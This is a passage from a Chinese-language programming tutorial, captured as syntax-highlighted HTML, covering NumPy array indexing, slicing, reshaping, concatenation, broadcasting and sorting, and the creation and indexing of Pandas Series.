operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n1<span class="token punctuation">.</span>ndim<span class="token punctuation">,</span>n1<span class="token punctuation">.</span>shape<span class="token punctuation">,</span>n1<span class="token punctuation">.</span>size<span class="token punctuation">,</span>n1<span class="token punctuation">.</span>dtype<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="三、操作"><a href="#三、操作" class="headerlink" title="三、操作"></a>三、操作</h2><h3 id="1-索引"><a href="#1-索引" class="headerlink" title="1. 索引"></a>1. 索引</h3><h4 id="下标索引"><a href="#下标索引" class="headerlink" title="下标索引"></a>下标索引</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npl1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">]</span>n1 <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>l1<span class="token punctuation">)</span><span class="token comment">#两种方法等效</span><span class="token keyword">print</span><span class="token punctuation">(</span>n1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="布尔索引"><a href="#布尔索引" class="headerlink" title="布尔索引"></a>布尔索引</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npl1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">]</span>n1 <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>l1<span class="token punctuation">)</span><span class="token comment"># 通过数组的逻辑运算后，我们得到的结果是一个与原数组维度和长度都一样的布尔数组</span><span class="token keyword">print</span><span class="token punctuation">(</span>n1<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment"># 布尔索引即通过一个布尔数组来索引目标数组，找出目标数组中与布尔数组中值为 True 的对应的数据</span><span class="token keyword">print</span><span class="token punctuation">(</span>n1<span class="token punctuation">[</span>n1<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意：</strong>符合条件的元素会以一维数组的形式返回，通过布尔索引，我们可以很快找出数组中满足既定条件的部分元素。</p><h3 id="2-切片"><a href="#2-切片" class="headerlink" title="2. 切片"></a>2. 切片</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npn2 <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n2<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n2<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>n3 <span class="token operator">=</span> np<span class="token punctuation">.</span>ones<span class="token punctuation">(</span>shape <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>int16<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n3<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n3<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n3<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-变形"><a href="#3-变形" class="headerlink" title="3. 变形"></a>3. 变形</h3><ul><li>n1.reshape()</li><li>传入一个元祖</li><li>改变的size必须和原size相同</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npn4 <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span>size <span class="token operator">=</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n4<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n4<span class="token punctuation">.</span>shape<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>参数-1为自动计算</li><li>不能两个参数都为-1</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npn4 <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span>size <span class="token operator">=</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n4<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n4<span class="token punctuation">.</span>shape<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-级联"><a href="#4-级联" class="headerlink" title="4. 级联"></a>4. 级联</h3><p><code>np.concatenate() </code>级联需要注意的点：</p><ol><li>级联的参数是列表：一定要加中括号或小括号</li><li>维度必须相同</li><li>axis方向对应的形状可以不相符</li><li>级联的方向默认是shape这个tuple的第一个值所代表的维度方向</li><li>可通过axis参数改变级联的方向</li></ol><table><thead><tr><th>函数</th><th align="center">说明</th><th align="center">备注</th></tr></thead><tbody><tr><td>np.concatenate((n1,n2),axis=None)</td><td align="center">级联</td><td align="center"># axis指定级联方向取值0 or 1</td></tr><tr><td>np.hstack((n1,n2))</td><td align="center">水平级联</td><td align="center">\</td></tr><tr><td>np.vstack((n1,n2))</td><td align="center">垂直级联</td><td align="center">\</td></tr></tbody></table><pre class="line-numbers language-python" data-language="python"><code class="language-python">n1 <span class="token operator">=</span> np<span class="token punctuation">.</span>ones<span class="token punctuation">(</span>shape <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>int16<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span>n2 <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>shape<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>int16<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>concatenate<span class="token punctuation">(</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span>n2<span class="token punctuation">)</span><span class="token punctuation">,</span>axis<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-切分"><a href="#5-切分" class="headerlink" title="5. 切分"></a>5. 切分</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>np.split</td><td>切分</td></tr><tr><td>np.vsplit</td><td>竖向切分</td></tr><tr><td>np.hsplit</td><td>横向切分</td></tr></tbody></table><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>split<span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="6-副本"><a href="#6-副本" class="headerlink" title="6. 副本"></a>6. 副本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">n2 <span class="token operator">=</span> n1<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="四、方法"><a href="#四、方法" class="headerlink" title="四、方法"></a>四、方法</h2><table><thead><tr><th align="left">函数</th><th align="left">NaN-safe Version</th><th>说明</th></tr></thead><tbody><tr><td align="left">n1.sum()</td><td align="left">np.nansum()</td><td>求和</td></tr><tr><td align="left">n1.max()</td><td align="left">np.nanmax()</td><td>求最大值</td></tr><tr><td align="left">n1.min()</td><td align="left">np.nanmin()</td><td>求最小值</td></tr><tr><td align="left">n1.mean()</td><td align="left">np.anmean()</td><td>求平均数</td></tr><tr><td align="left">n1.argmax()</td><td align="left">np.nanaremax()</td><td>最大值的索引</td></tr><tr><td align="left">n1.argmin()</td><td align="left">np.nanargmin()</td><td>最小值的索引</td></tr><tr><td align="left">np.prod()</td><td align="left">np.nanprod()</td><td>连乘</td></tr><tr><td align="left">np.std()</td><td align="left">np.nanstd()</td><td>方差</td></tr></tbody></table><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> npx <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="五、向量运算"><a href="#五、向量运算" class="headerlink" title="五、向量运算"></a>五、向量运算</h2><h3 id="1-形状相同时"><a href="#1-形状相同时" class="headerlink" title="1.形状相同时"></a>1.形状相同时</h3><p>两个数组 a 和 b 形状相同，即满足<code>a.shape == b.shape</code>时</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token comment"># 创建数组 a</span>a <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>              <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>              <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 创建数组 b</span>b <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>              <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>              <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 加法</span>result_1 <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token keyword">print</span><span class="token punctuation">(</span>result_1<span class="token punctuation">)</span><span class="token comment"># 乘法</span>result_2 <span class="token operator">=</span> a<span class="token operator">*</span>b<span class="token keyword">print</span><span class="token punctuation">(</span>result_2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-形状不同时（广播机制）"><a href="#2-形状不同时（广播机制）" class="headerlink" title="2.形状不同时（广播机制）"></a>2.形状不同时（广播机制）</h3><p><strong>广播：</strong>两个形状不同数组间运算时，它们对应维度的长度必须相同，或者其中一方为 1，才可以运算成功，否则就会报错。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#【重要】ndarray广播机制的两条规则</span><span class="token comment">#规则一：为缺失的维度补1</span><span class="token comment">#规则二：假定缺失元素用已有值填充</span><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token comment"># 创建数组 a</span>a <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 创建标量 b</span>b <span class="token operator">=</span> <span class="token number">2</span><span class="token comment"># 数组 a 与标量 b 相乘，并将结果赋值给 result_3</span>result_3 <span class="token operator">=</span> a<span class="token operator">*</span>b <span class="token keyword">print</span><span class="token punctuation">(</span>result_3<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token comment"># 创建数组 a</span>a <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>              <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>              <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">,</span>              <span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>            <span class="token comment"># 创建数组 b</span>b <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>   result_4 <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token keyword">print</span><span class="token punctuation">(</span>result_4<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、排序"><a href="#六、排序" class="headerlink" title="六、排序"></a>六、排序</h2><table><thead><tr><th>函数</th><th>说明</th><th>备注</th></tr></thead><tbody><tr><td>n.sort()</td><td>快速排序</td><td>np.sort()不改变输入</td></tr><tr><td>np.sort(n)</td><td>快速排序</td><td>ndarray.sort()本地处理，不占用空间，但改变输入</td></tr><tr><td>np.partition(a,k)</td><td>部分排序</td><td>当k为正时，我们想要得到最小的k个数<br>当k为负时，我们想要得到最大的k个数</td></tr></tbody></table><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token comment"># 创建数组 a</span>a <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 没有改变原数据</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 改变原数据</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Pandas"><a href="#Pandas" class="headerlink" title="Pandas"></a>Pandas</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">from</span> pandas <span class="token keyword">import</span> Series<span class="token punctuation">,</span>DataFrame<span class="token comment">#设置列名对齐</span>pd<span class="token punctuation">.</span>set_option<span class="token punctuation">(</span><span class="token string">'display.unicode.east_asian_width'</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="一、Series"><a href="#一、Series" class="headerlink" title="一、Series"></a>一、Series</h2><p>Series是一种类似与<strong>一维数组</strong>的对象，由下面两个部分组成：</p><ul><li>values：一组数据（ndarray类型）</li><li>index：相关的数据索引标签</li></ul><h3 id="1-Series的创建"><a href="#1-Series的创建" class="headerlink" title="1.  Series的创建"></a>1.  Series的创建</h3><h4 id="1-由列表或numpy数组创建"><a href="#1-由列表或numpy数组创建" class="headerlink" title="1. 由列表或numpy数组创建"></a>1. 由列表或numpy数组创建</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">l2 <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">]</span><span class="token punctuation">)</span>s1 <span class="token operator">=</span> Series<span class="token punctuation">(</span>data <span class="token operator">=</span> l2<span class="token punctuation">,</span>index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'语文'</span><span class="token punctuation">,</span><span class="token string">'数学'</span><span class="token punctuation">,</span><span class="token string">'英语'</span><span class="token punctuation">,</span><span class="token string">'理综'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>还可以通过设置index参数指定索引</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#默认索引为0到N-1的整数型索引</span>s1 <span class="token operator">=</span> Series<span class="token punctuation">(</span>np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>index <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'abcdef'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span>s1<span class="token punctuation">.</span>index <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'abcdef'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">.</span>index<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>特别地，由ndarray创建的是引用，而不是副本。对Series元素的改变也会改变原来的ndarray对象中的元素。（列表没有这种情况）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 列表</span>n1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>s1 <span class="token operator">=</span> Series<span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span>n1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token comment"># numpy数组</span>n2 <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">)</span>s2 <span class="token operator">=</span> Series<span class="token punctuation">(</span>n2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span>n2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token keyword">print</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-由字典创建"><a href="#2-由字典创建" class="headerlink" title="2. 由字典创建"></a>2. 由字典创建</h4><ul><li>Key作为index，value作为values</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">d1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'语文'</span><span class="token punctuation">:</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token string">'数学'</span><span class="token punctuation">:</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token string">'英语'</span><span class="token punctuation">:</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token string">'理综'</span><span class="token punctuation">:</span><span class="token number">300</span><span class="token punctuation">}</span>s1 <span class="token operator">=</span> Series<span class="token punctuation">(</span>d1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>必须传入一维的数据，多维会报错</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 多维的数组 error</span>n1 <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>Series<span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-Series的索引和切片"><a href="#2-Series的索引和切片" class="headerlink" title="2. Series的索引和切片"></a>2. Series的索引和切片</h3><h4 id="1-索引-1"><a href="#1-索引-1" class="headerlink" title="1. 索引"></a>1. 索引</h4><p>可以使用中括号取单个索引（此时返回的是元素类型），或者中括号里一个列表取多个索引（此时返回的仍然是一个Series类型）。分为显示索引和隐式索引：</p><h5 id="1-显式索引："><a href="#1-显式索引：" class="headerlink" title="(1) 显式索引："></a>(1) 显式索引：</h5><ul><li>使用index中的元素作为索引值</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">s1 <span class="token operator">=</span> Series<span class="token punctuation">(</span>data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>index <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">'ABCDE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s1<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token 